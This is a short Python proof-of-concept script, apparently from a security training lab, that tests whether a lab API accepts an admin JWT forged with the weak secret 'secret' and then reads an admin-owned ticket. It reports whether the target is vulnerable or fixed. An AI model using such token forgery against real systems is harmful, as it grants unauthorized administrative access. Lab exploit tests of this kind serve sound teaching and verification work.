"""F04 Weak JWT secret: forge an admin token because the secret is 'secret'.

Expected (vuln): a self-forged admin token is accepted and reads admin ticket 4.
Expected (fixed): the forged token (weak secret) is rejected -> 401.
"""

from lab import auth_header, banner, client, forge_token


def run():
    banner("Weak JWT secret -> forge admin token")
    c = client()
    forged = forge_token(user_id=999, role="admin")
    r = c.get("/api/tickets/4", headers=auth_header(forged))  # admin-owned ticket
    print(f"forged-admin GET /api/tickets/4 -> {r.status_code} {r.text[:120]}")
    return r.status_code == 200


if __name__ == "__main__":
    print("VULNERABLE" if run() else "not exploitable (fixed)")
